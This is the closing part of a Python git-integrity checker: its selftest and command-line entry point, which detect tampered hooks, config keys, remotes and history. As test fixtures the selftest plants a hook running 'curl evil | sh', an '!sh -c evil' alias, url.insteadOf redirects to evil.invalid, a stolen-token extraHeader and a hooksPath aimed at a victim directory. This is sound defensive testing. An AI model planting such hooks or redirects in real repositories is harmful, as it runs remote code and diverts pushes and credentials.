                           "(release), FAIL[gitmeta] (dev), no baseline is saved over it; the revert test uses the "
                           "tree hash --save recorded (none or another: no acceptance) and git ignores replace refs",
                           rc_R == 1 and "FAIL[env-unknown]" in o_R and "replace refs/replace/" in o_R
                           and "NOTE[reverted]" not in o_R and rc_Rd == 1 and "FAIL[gitmeta]" in o_Rd
                           and "history substitution" in o_Rd and rc_Rs == 1 and rc_ok == 0 and rc_nt == 1
                           and rc_ot == 1 and not fooled))
            # gitmeta: the Stage 1 snapshot (the pin's), restored key by key
            os.remove(s2); save(t2, s2)
            pin2 = json.loads(json.dumps(snapshot(t2)))
            g2("config", "alias.st", "!sh -c evil")
            g2("config", "branch.feature.merge", "refs/heads/feature")     # the operator's benign key
            hk = os.path.join(t2, ".git", "hooks", "post-commit")
            open(hk, "w").write("#!/bin/sh\ncurl evil | sh\n"); os.chmod(hk, 0o755)
            smp = os.path.join(t2, ".git", "hooks", "pre-commit.sample")
            had_smp = os.path.exists(smp)
            if had_smp:
                orig_smp = open(smp, "rb").read(); open(smp, "ab").write(b"\nexit 0\n")
            rc_g, o_g = out_of(check, t2, s2, "", pin2, True)
            rc_gr, o_gr = out_of(restore_gitmeta, t2, pin2)
            rc_g2, _ = out_of(check, t2, s2, "", pin2, True)
            cfg_now = g2("config", "--list").stdout
            checks.append(("B1c: a planted hook, an edited sample hook and risky keys are FAIL[gitmeta] (not "
                           "env-unknown); --restore-gitmeta restores the snapshotted hooks and keys only (the "
                           "operator's branch key stays) and the check passes",
                           rc_g == 1 and "FAIL[gitmeta]" in o_g and "env-unknown" not in o_g and rc_gr == 0
                           and rc_g2 == 0 and "branch.feature.merge=refs/heads/feature" in cfg_now
                           and "alias.st" not in cfg_now
                           and not os.path.exists(hk) and (not had_smp or open(smp, "rb").read() == orig_smp)))
            # review H (attack H): a core.hooksPath -- global or local -- at another directory is stop 3, and the
            # cure never writes or deletes there (it deleted that directory's files)
            victim = t2 + "-cfg/victim"; os.makedirs(victim)
            for n_ in ("thesis.tex", "notes.md"):
                open(os.path.join(victim, n_), "w").write("precious\n")
            open(gcfg, "w").write(f"[core]\n\thooksPath = {victim}\n")
            rc_hp, o_hp = out_of(check, t2, s2, "", pin2, True)
            rc_hpr, o_hpr = out_of(restore_gitmeta, t2, pin2)
            vic_ok = sorted(os.listdir(victim)) == ["notes.md", "thesis.tex"] and all(
                open(os.path.join(victim, n_)).read() == "precious\n" for n_ in ("notes.md", "thesis.tex"))
            open(gcfg, "w").write("")
            g2("config", "core.hooksPath", victim)
            rc_hl, o_hl = out_of(check, t2, s2, "", pin2, True)
            rc_hlr, o_hlr = out_of(restore_gitmeta, t2, pin2)
            vic_ok = vic_ok and sorted(os.listdir(victim)) == ["notes.md", "thesis.tex"]
            g2("config", "--unset", "core.hooksPath")
            rc_hb, _ = out_of(check, t2, s2, "", pin2, True)
            # ... and a snapshot taken with the hooks elsewhere is no licence either: the cure writes in <gitdir>/hooks
            open(gcfg, "w").write(f"[core]\n\thooksPath = {victim}\n")
            pin_v = json.loads(json.dumps(snapshot(t2)))
            open(os.path.join(victim, "later.txt"), "w").write("also precious\n")
            rc_hv, o_hv = out_of(restore_gitmeta, t2, pin_v)
            vic_ok = vic_ok and sorted(os.listdir(victim)) == ["later.txt", "notes.md", "thesis.tex"]
            open(gcfg, "w").write("")
            # the resolved directory alone (.git/hooks made a symlink elsewhere) and the setting alone (a hooksPath
            # naming <gitdir>/hooks itself) are each stop 3
            own_h = os.path.join(t2, ".git", "hooks")
            os.rename(own_h, own_h + ".real"); os.symlink(victim, own_h)
            rc_sl, o_sl = out_of(check, t2, s2, "", pin2, True)
            rc_slr, o_slr = out_of(restore_gitmeta, t2, pin2)
            vic_ok = vic_ok and sorted(os.listdir(victim)) == ["later.txt", "notes.md", "thesis.tex"]
            os.remove(own_h); os.rename(own_h + ".real", own_h)
            g2("config", "core.hooksPath", own_h)
            rc_same, o_same = out_of(check, t2, s2, "", pin2, True)
            g2("config", "--unset", "core.hooksPath")
            checks.append(("B1c review H: a global or local core.hooksPath at another directory is FAIL[env-unknown] "
                           "(stop 3); --restore-gitmeta refuses and that directory's files are untouched",
                           rc_hp == 1 and "FAIL[env-unknown]" in o_hp and rc_hpr == 1 and "FAIL[env-unknown]" in o_hpr
                           and "removed" not in o_hpr and rc_hl == 1 and "FAIL[env-unknown]" in o_hl and rc_hlr == 1
                           and "FAIL[env-unknown]" in o_hlr and rc_hv == 1 and "FAIL[env-unknown]" in o_hv and vic_ok
                           and rc_sl == 1 and "FAIL[env-unknown]" in o_sl and rc_slr == 1 and "FAIL[env-unknown]" in o_slr
                           and rc_same == 1 and "FAIL[env-unknown]" in o_same and rc_hb == 0))
            no_snap = dict(pin2); no_snap.pop("hooks_dir")
            rc_ns, o_ns = out_of(restore_gitmeta, t2, None)
            rc_ns2, o_ns2 = out_of(restore_gitmeta, t2, no_snap)
            checks.append(("B1c review L1: a pin without a (complete) Stage 1 snapshot: --restore-gitmeta is "
                           "FAIL[env-unknown] (stop 3)",
                           rc_ns == 1 and "FAIL[env-unknown]" in o_ns and rc_ns2 == 1 and "FAIL[env-unknown]" in o_ns2))
            # review U (attack U): where the work goes is stop 3 in every scope, never a gitmeta restore
            dest_ok = []
            for scope_, key_, val_ in (("local", "url.https://evil.invalid/.insteadOf", "https://github.com/"),
                                       ("local", "http.extraHeader", "Authorization: Bearer stolen"),
                                       ("global", "url.https://evil.invalid/.pushInsteadOf", "https://github.com/"),
                                       ("global", "http.https://github.com/.extraHeader", "Authorization: x"),
                                       ("local", "branch.main.pushRemote", "elsewhere"),
                                       ("local", "branch.main.remote", "elsewhere"),
                                       ("local", "remote.pushDefault", "elsewhere"),
                                       ("global", "core.sshCommand", "ssh -i /tmp/k")):
                g2("config", f"--{scope_}", key_, val_)
                rc_d, o_d = out_of(check, t2, s2, "", pin2, True)
                rc_dr, o_dr = out_of(restore_gitmeta, t2, pin2)
                g2("config", f"--{scope_}", "--unset", key_)
                dest_ok.append(rc_d == 1 and "FAIL[env-unknown]" in o_d and key_.lower().split(".")[-1] in o_d.lower()
                               and rc_dr == 1 and "FAIL[env-unknown]" in o_dr)
            rc_d0, _ = out_of(check, t2, s2, "", pin2, True)
            checks.append(("B1c review U: url.*.insteadOf/pushInsteadOf, http.*.extraHeader, branch.*.pushRemote/"
                           "remote, remote.pushDefault, core.sshCommand (local or global) are FAIL[env-unknown] "
                           "(stop 3), never restored by the operator", all(dest_ok) and rc_d0 == 0))
            g2("remote", "add", "origin", "https://example.invalid/a.git")
            rc_r, o_r = out_of(check, t2, s2, "", pin2, True)
            rc_rdev, o_rdev = out_of(check, t2, s2, "", pin2, False)     # dev: no snapshot or identity check (M1)
            g2("config", "alias.st", "!sh -c evil")
            rc_rr, o_rr = out_of(restore_gitmeta, t2, pin2)
            still = "alias.st" in g2("config", "--list").stdout
            g2("remote", "remove", "origin"); g2("config", "--unset", "alias.st")
            g2("config", "user.name", "someone else")
            rc_u, o_u = out_of(check, t2, s2, "", pin2, True)
            g2("config", "user.name", "t")
            # review L2: the human's own ~/.gitconfig user/credential settings are no foreign change; a remote's url
            # there is (destinations, like core.hooksPath, count in every scope)
            g2("config", "--global", "user.name", "the human"); g2("config", "--global", "credential.helper", "store")
            rc_gu, o_gu = out_of(check, t2, s2, "", pin2, True)
            open(gcfg, "w").write("")
            g2("config", "--global", "remote.origin.url", "https://elsewhere.invalid/x.git")
            rc_gr, o_gr = out_of(check, t2, s2, "", pin2, True)
            open(gcfg, "w").write("")
            checks.append(("B1c review L2: a global user/credential change is no stop 3 (identity is the repository's "
                           "own config); a global remote url is FAIL[env-unknown]",
                           rc_gu == 0 and "env-unknown" not in o_gu and rc_gr == 1 and "FAIL[env-unknown]" in o_gr
                           and "remote.origin.url" in o_gr))
            g2("commit", "-q", "--amend", "--allow-empty", "-m", "rewritten")
            rc_h, o_h = out_of(check, t2, s2, "", None, True)
            rc_hdev, o_hdev = out_of(check, t2, s2, "", pin2, False)
            rc_h2, o_h2 = out_of(revert_foreign, t2, s2, pin2)
            checks.append(("B1c: a changed remote or user key is FAIL[env-unknown] (stop 3), --restore-gitmeta "
                           "refuses and restores nothing; rewritten pinned history is env-unknown too and is not "
                           "reverted",
                           rc_r == 1 and "FAIL[env-unknown]" in o_r and "remote.origin.url" in o_r
                           and rc_rr == 1 and "FAIL[env-unknown]" in o_rr and still
                           and rc_u == 1 and "FAIL[env-unknown]" in o_u and "user.name" in o_u
                           and rc_h == 1 and "FAIL[env-unknown]" in o_h and rc_h2 == 1 and "env-unknown" in o_h2))
            checks.append(("B1c review M1: in dev the snapshot and identity checks do not apply: a remote added is no "
                           "failure, rewritten history is FAIL[gitmeta] without env-unknown (as before B1c)",
                           rc_rdev == 0 and "env-unknown" not in o_rdev and rc_hdev == 1 and "FAIL[gitmeta]" in o_hdev
                           and "no longer in the history" in o_hdev and "env-unknown" not in o_hdev))
        finally:
            for k_, v_ in env_was.items():
                if v_ is None:
                    os.environ.pop(k_, None)
                else:
                    os.environ[k_] = v_
            shutil.rmtree(t2, ignore_errors=True)
            shutil.rmtree(t2 + "-cfg", ignore_errors=True)

        ok = all(p for _, p in checks)
        print()
        for n, p in checks:
            print(f"  {'ok  ' if p else 'FAIL'}  {n}")
        print("selftest:", "ok" if ok else "FAILED")
        return 0 if ok else 1
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--save", action="store_true")
    ap.add_argument("--check", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    ap.add_argument("--resave-operator", action="store_true",
                    help="re-save after HEAD moved only by the operator's empty commits (FAIL[head-moved-operator])")
    ap.add_argument("--restore-gitmeta", action="store_true",
                    help="release cure of FAIL[gitmeta]: restore the hooks and config keys of the Stage 1 snapshot")
    ap.add_argument("--revert-foreign", action="store_true",
                    help="release cure of FAIL[head-moved]: git revert --no-edit the whole foreign range (-m 1 merges)")
    ap.add_argument("--reason")
    ap.add_argument("--repo", default=REPO)
    ap.add_argument("--file", default=SNAP)
    a = ap.parse_args()
    if a.selftest:
        return selftest()
    if a.save:
        return save(a.repo, a.file)
    if a.check:
        rel = release_run()     # the snapshot and stop-3 checks are release-only (review M1): dev unchanged
        return check(a.repo, a.file, pin=pin_snapshot() if rel else None, reverts=rel)
    if a.restore_gitmeta:
        return restore_gitmeta(a.repo, pin_snapshot())
    if a.revert_foreign:
        return revert_foreign(a.repo, a.file, pin_snapshot())
    if a.resave_operator:
        return resave_operator(a.repo, a.file, a.reason)
    ap.print_help()
    return 2


if __name__ == "__main__":
    try:
        import project
    except ImportError:     # a copy of this script alone (lanecheck's selftest runs one): no run_main there
        sys.exit(main())
    sys.exit(project.run_main(main))
